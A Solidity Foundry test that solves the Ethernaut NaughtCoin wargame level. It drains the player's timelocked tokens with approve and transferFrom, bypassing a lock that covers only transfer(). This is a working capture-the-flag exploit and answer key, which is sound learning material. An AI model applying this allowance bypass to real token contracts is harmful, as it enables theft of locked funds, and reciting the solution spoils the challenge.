// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/15-NaughtCoin/NaughtCoin.sol";
import "../src/15-NaughtCoin/NaughtCoinFactory.sol";

contract NaughtCoinTest is Test {
    Ethernaut ethernaut;
    NaughtCoinFactory level;
    NaughtCoin instance;
    address player = makeAddr("hello gate keeper");
    address instanceAddress;

    function setUp() public {
        ethernaut = new Ethernaut();
        level = new NaughtCoinFactory();
        ethernaut.registerLevel(level);
        startHoax(player);

        instanceAddress = ethernaut.createLevelInstance(level);
        instance = NaughtCoin(payable(instanceAddress));
    }

    function testNaughtCoinHack() public {
        address attacker = address(123);
        instance.approve(attacker, type(uint256).max);
        changePrank(attacker);
        instance.transferFrom(player, attacker, instance.balanceOf(player));

        assertEq(instance.balanceOf(player), 0);

        changePrank(player);
        bool levelCompleted = ethernaut.submitLevelInstance(
            payable(instanceAddress)
        );
        assert(levelCompleted);
    }
}
